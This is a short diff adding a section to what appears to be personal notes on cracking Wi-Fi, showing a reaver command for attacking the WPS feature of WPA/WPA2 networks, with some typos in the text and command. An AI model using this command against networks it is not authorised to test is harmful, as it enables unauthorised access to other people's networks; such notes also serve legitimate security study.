@@ -78,3 +78,14 @@ ___
 - Run aircrackpng with the .cap file similar to above to crack the key
 ___
 
+### Exploiting WPS Feature for WPA/WPA2 Wifi Network
+
+- First, run reaver WPS cracker utilzing the command 
+
+   `reaver --bssid <Network MAC? --channel <channel #> --interface <device name> -vvv --no-associate`
+
+- next, associate your device to the network utilizing above command
+
+___
+
+
